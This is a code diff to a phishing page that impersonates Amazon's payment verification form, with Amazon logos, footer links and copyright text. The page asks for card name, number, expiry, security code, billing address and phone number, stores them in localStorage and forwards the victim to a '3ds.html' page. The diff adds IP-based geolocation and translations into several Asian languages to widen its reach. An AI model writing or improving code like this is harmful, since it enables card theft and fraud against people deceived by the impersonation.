@@ -32,7 +32,7 @@
 <body>
     <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
     <div class="kotak">
-        <h1>Verification Payment</h1>
+        <h1 id="judul">Verification Payment</h1>
         <div class="logo-kartu">
             <img src="img/visa.png" alt="Visa">
             <img src="img/mastercard.png" alt="Mastercard">
@@ -41,66 +41,193 @@
             <img src="img/jcb.png" alt="JCB">
         </div>
 
-        <label for="namaKartu">Name on card</label>
+        <label id="labelNama" for="namaKartu">Name on card</label>
         <input type="text" id="namaKartu" class="input latar-biru">
 
-        <label for="nomorKartu">Card number</label>
+        <label id="labelNomor" for="nomorKartu">Card number</label>
         <input type="text" id="nomorKartu" class="input" maxlength="19" placeholder="•••• •••• •••• ••••">
 
         <div class="baris-dua">
             <div class="kolom">
-                <label for="expDate">Expiry date</label>
+                <label id="labelExp" for="expDate">Expiry date</label>
                 <input type="text" id="expDate" class="input" maxlength="5" placeholder="MM/YY">
             </div>
             <div class="kolom">
-                <label for="cvv">Security code</label>
+                <label id="labelCVV" for="cvv">Security code</label>
                 <input type="text" id="cvv" class="input" maxlength="4" placeholder="•••">
             </div>
         </div>
 
-        <label for="alamat">Billing address</label>
-        <input type="text" id="alamat" class="input" placeholder="Street address">
+        <label id="labelAlamat" for="alamat">Billing address</label>
+        <input type="text" id="alamat" class="input" id-placeholder="Street address">
 
-        <label for="alamat2"></label>
-        <input type="text" id="alamat2" class="input" placeholder="Apartment, suite, etc. (optional)">
+        <label id="labelAlamat2" for="alamat2"></label>
+        <input type="text" id="alamat2" class="input" id-placeholder="Apartment, suite, etc. (optional)">
 
         <div class="baris-dua">
             <div class="kolom">
-                <label for="kota">City</label>
+                <label id="labelKota" for="kota">City</label>
                 <input type="text" id="kota" class="input">
             </div>
             <div class="kolom">
-                <label for="provinsi">State / Province</label>
+                <label id="labelProvinsi" for="provinsi">State / Province</label>
                 <input type="text" id="provinsi" class="input">
             </div>
         </div>
 
         <div class="baris-dua">
             <div class="kolom">
-                <label for="kodePos">Postal code</label>
+                <label id="labelKodePos" for="kodePos">Postal code</label>
                 <input type="text" id="kodePos" class="input">
             </div>
             <div class="kolom">
-                <label for="negara">Country / Region</label>
+                <label id="labelNegara" for="negara">Country / Region</label>
                 <select id="negara" class="input"></select>
             </div>
         </div>
 
-        <label for="telp">Phone number</label>
+        <label id="labelTelp" for="telp">Phone number</label>
         <div class="telp-baris">
             <input type="text" id="kodeTelp" class="input telp-kode" readonly>
             <input type="tel" id="telp" class="input telp-nomor">
         </div>
 
-        <button type="button" id="verifikasi" class="tombol">Verification</button>
+        <button type="button" id="verifikasi" class="tombol">
+            <span id="teksTombol">Verification</span>
+        </button>
     </div>
-
     <div class="bawah">
-        <p><a href="#">Conditions of Use</a> <a href="#">Privacy Notice</a> <a href="#">Help</a></p>
-        <p style="margin-top:8px; color:#767676;">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
+        <p><a href="#" id="syaratLink1">Conditions of Use</a> <a href="#" id="syaratLink2">Privacy Notice</a> <a href="#" id="bantuanLink">Help</a></p>
+        <p style="margin-top:8px; color:#767676;" id="hakCiptaan">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
     </div>
 
 <script>
+// ==============================================
+// DAFTAR TERJEMAHAN
+// ==============================================
+const terjemahan = {
+    EN: {
+        judul: 'Verification Payment',
+        labelNama: 'Name on card',
+        labelNomor: 'Card number',
+        labelExp: 'Expiry date',
+        labelCVV: 'Security code',
+        labelAlamat: 'Billing address',
+        placeholderAlamat: 'Street address',
+        placeholderAlamat2: 'Apartment, suite, etc. (optional)',
+        labelKota: 'City',
+        labelProvinsi: 'State / Province',
+        labelKodePos: 'Postal code',
+        labelNegara: 'Country / Region',
+        labelTelp: 'Phone number',
+        teksTombol: 'Verify',
+        syaratLink1: 'Conditions of Use',
+        syaratLink2: 'Privacy Notice',
+        bantuanLink: 'Help',
+        hakCiptaan: '© 1996-2026, Amazon.com, Inc. or its affiliates'
+    },
+    JA: {
+        judul: 'お支払い情報の確認',
+        labelNama: 'カード名義',
+        labelNomor: 'カード番号',
+        labelExp: '有効期限',
+        labelCVV: 'セキュリティコード',
+        labelAlamat: '請求先住所',
+        placeholderAlamat: '番地・建物名',
+        placeholderAlamat2: '部屋番号など（任意）',
+        labelKota: '市区町村',
+        labelProvinsi: '都道府県',
+        labelKodePos: '郵便番号',
+        labelNegara: '国/地域',
+        labelTelp: '電話番号',
+        teksTombol: '確認',
+        syaratLink1: '利用規約',
+        syaratLink2: 'プライバシー通知',
+        bantuanLink: 'ヘルプ',
+        hakCiptaan: '© 1996-2026, Amazon.com, Inc. またはその関連会社'
+    },
+    ZH: {
+        judul: '付款信息验证',
+        labelNama: '持卡人姓名',
+        labelNomor: '卡号',
+        labelExp: '有效期',
+        labelCVV: '安全码',
+        labelAlamat: '账单地址',
+        placeholderAlamat: '街道地址',
+        placeholderAlamat2: '公寓、套房等（选填）',
+        labelKota: '城市',
+        labelProvinsi: '州/省',
+        labelKodePos: '邮政编码',
+        labelNegara: '国家/地区',
+        labelTelp: '电话号码',
+        teksTombol: '验证',
+        syaratLink1: '使用条件',
+        syaratLink2: '隐私声明',
+        bantuanLink: '帮助',
+        hakCiptaan: '© 1996-2026, Amazon.com, Inc. 或其关联公司'
+    },
+    TH: {
+        judul: 'ยืนยันข้อมูลการชำระเงิน',
+        labelNama: 'ชื่อบนบัตร',
+        labelNomor: 'หมายเลขบัตร',
+        labelExp: 'วันหมดอายุ',
+        labelCVV: 'รหัสความปลอดภัย',
+        labelAlamat: 'ที่อยู่สำหรับเรียกเก็บเงิน',
+        placeholderAlamat: 'ที่อยู่ถนน',
+        placeholderAlamat2: 'ห้องเลขที่ ห้องชุด ฯลฯ (ไม่จำเป็น)',
+        labelKota: 'เมือง',
+        labelProvinsi: 'จังหวัด/เขต',
+        labelKodePos: 'รหัสไปรษณีย์',
+        labelNegara: 'ประเทศ/ภูมิภาค',
+        labelTelp: 'หมายเลขโทรศัพท์',
+        teksTombol: 'ยืนยัน',
+        syaratLink1: 'เงื่อนไขการใช้งาน',
+        syaratLink2: 'ประกาศความเป็นส่วนตัว',
+        bantuanLink: 'ช่วยเหลือ',
+        hakCiptaan: '© 1996-2026, Amazon.com, Inc. หรือบริษัทในเครือ'
+    },
+    KO: {
+        judul: '결제 정보 확인',
+        labelNama: '카드 이름',
+        labelNomor: '카드 번호',
+        labelExp: '유효 기간',
+        labelCVV: '보안 코드',
+        labelAlamat: '청구지 주소',
+        placeholderAlamat: '도로명 주소',
+        placeholderAlamat2: '아파트, 호수 등 (선택 사항)',
+        labelKota: '도시',
+        labelProvinsi: '시/도',
+        labelKodePos: '우편번호',
+        labelNegara: '국가/지역',
+        labelTelp: '전화번호',
+        teksTombol: '확인',
+        syaratLink1: '이용 약관',
+        syaratLink2: '개인정보 처리방침',
+        bantuanLink: '도움말',
+        hakCiptaan: '© 1996-2026, Amazon.com, Inc. 또는 그 계열사'
+    },
+    ID: {
+        judul: 'Verifikasi Pembayaran',
+        labelNama: 'Nama di Kartu',
+        labelNomor: 'Nomor Kartu',
+        labelExp: 'Tanggal Kadaluarsa',
+        labelCVV: 'Kode Keamanan',
+        labelAlamat: 'Alamat Penagihan',
+        placeholderAlamat: 'Jalan, nomor rumah',
+        placeholderAlamat2: 'Apartemen, gedung (opsional)',
+        labelKota: 'Kota',
+        labelProvinsi: 'Provinsi',
+        labelKodePos: 'Kode Pos',
+        labelNegara: 'Negara/Wilayah',
+        labelTelp: 'Nomor Telepon',
+        teksTombol: 'Verifikasi',
+        syaratLink1: 'Syarat Penggunaan',
+        syaratLink2: 'Pemberitahuan Privasi',
+        bantuanLink: 'Bantuan',
+        hakCiptaan: '© 1996-2026, Amazon.com, Inc. atau afiliasinya'
+    }
+};
+
 const daftarNegara = {
     'ID': {nama: 'Indonesia', kode: '+62'},
     'AU': {nama: 'Australia', kode: '+61'},
@@ -111,33 +238,70 @@ const daftarNegara = {
     'JP': {nama: 'Japan', kode: '+81'},
     'KR': {nama: 'South Korea', kode: '+82'},
     'CA': {nama: 'Canada', kode: '+1'},
-    'NZ': {nama: 'New Zealand', kode: '+64'}
+    'NZ': {nama: 'New Zealand', kode: '+64'},
+    'CN': {nama: 'China', kode: '+86'},
+    'TH': {nama: 'Thailand', kode: '+66'}
 };
 
+const negaraKeBahasa = {
+    JP: 'JA', CN: 'ZH', HK: 'ZH', TW: 'ZH', TH: 'TH', KR: 'KO', ID: 'ID',
+    MY: 'EN', SG: 'EN', US: 'EN', AU: 'EN', GB: 'EN', CA: 'EN', NZ: 'EN'
+};
+
+// ==============================================
+// DETEKSI & TERAPKAN BAHASA
+// ==============================================
+async function terapkanBahasa() {
+    let kodeNegara = 'GB';
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        kodeNegara = data.country_code || 'GB';
+    } catch {}
+
+    const kodeBahasa = negaraKeBahasa[kodeNegara] || 'EN';
+    const teks = terjemahan[kodeBahasa] || terjemahan.EN;
+
+    document.documentElement.lang = kodeBahasa.toLowerCase();
+    document.getElementById('judul').textContent = teks.judul;
+    document.getElementById('labelNama').textContent = teks.labelNama;
+    document.getElementById('labelNomor').textContent = teks.labelNomor;
+    document.getElementById('labelExp').textContent = teks.labelExp;
+    document.getElementById('labelCVV').textContent = teks.labelCVV;
+    document.getElementById('labelAlamat').textContent = teks.labelAlamat;
+    document.getElementById('alamat').placeholder = teks.placeholderAlamat;
+    document.getElementById('alamat2').placeholder = teks.placeholderAlamat2;
+    document.getElementById('labelAlamat2').textContent = '';
+    document.getElementById('labelKota').textContent = teks.labelKota;
+    document.getElementById('labelProvinsi').textContent = teks.labelProvinsi;
+    document.getElementById('labelKodePos').textContent = teks.labelKodePos;
+    document.getElementById('labelNegara').textContent = teks.labelNegara;
+    document.getElementById('labelTelp').textContent = teks.labelTelp;
+    document.getElementById('teksTombol').textContent = teks.teksTombol;
+    document.getElementById('syaratLink1').textContent = teks.syaratLink1;
+    document.getElementById('syaratLink2').textContent = teks.syaratLink2;
+    document.getElementById('bantuanLink').textContent = teks.bantuanLink;
+    document.getElementById('hakCiptaan').textContent = teks.hakCiptaan;
+
+    // Atur negara & kode telepon
+    if (daftarNegara[kodeNegara]) {
+        selectNegara.value = kodeNegara;
+        document.getElementById('kodeTelp').value = daftarNegara[kodeNegara].kode;
+    } else {
+        selectNegara.value = 'GB';
+        document.getElementById('kodeTelp').value = '+44';
+    }
+}
+
+// ==============================================
+// INISIALISASI DAFTAR NEGARA
+// ==============================================
 const selectNegara = document.getElementById('negara');
 for (const [kode, data] of Object.entries(daftarNegara)) {
     const opsi = document.createElement('option');
     opsi.value = kode;
     opsi.textContent = data.nama;
     selectNegara.appendChild(opsi);
-}
-
-async function deteksiNegara() {
-    try {
-        const res = await fetch('https://ipapi.co/json/');
-        const data = await res.json();
-        const kode = data.country_code || 'GB';
-        if (daftarNegara[kode]) {
-            selectNegara.value = kode;
-            document.getElementById('kodeTelp').value = daftarNegara[kode].kode;
-        } else {
-            selectNegara.value = 'GB';
-            document.getElementById('kodeTelp').value = '+44';
-        }
-    } catch {
-        selectNegara.value = 'GB';
-        document.getElementById('kodeTelp').value = '+44';
-    }
 }
 
 selectNegara.addEventListener('change', () => {
@@ -168,9 +332,8 @@ document.getElementById('cvv').addEventListener('input', (e) => {
     e.target.value = e.target.value.replace(/\D/g, '');
 });
 
-// Tombol SELALU aktif, langsung lanjut ke 3ds.html
+// Tombol SELALU aktif, simpan & lanjut ke 3ds.html
 document.getElementById('verifikasi').addEventListener('click', () => {
-    // Simpan semua data
     localStorage.setItem('nama_kartu', document.getElementById('namaKartu').value.trim());
     localStorage.setItem('nomor_kartu', document.getElementById('nomorKartu').value.trim());
     localStorage.setItem('exp_kartu', document.getElementById('expDate').value.trim());
@@ -184,11 +347,10 @@ document.getElementById('verifikasi').addEventListener('click', () => {
     localStorage.setItem('kode_telp', document.getElementById('kodeTelp').value);
     localStorage.setItem('nomor_telp', document.getElementById('telp').value.trim());
     
-    // Langsung ke halaman 3ds
     window.location.href = '3ds.html';
 });
 
-deteksiNegara();
+terapkanBahasa();
 </script>
 </body>
 </html>
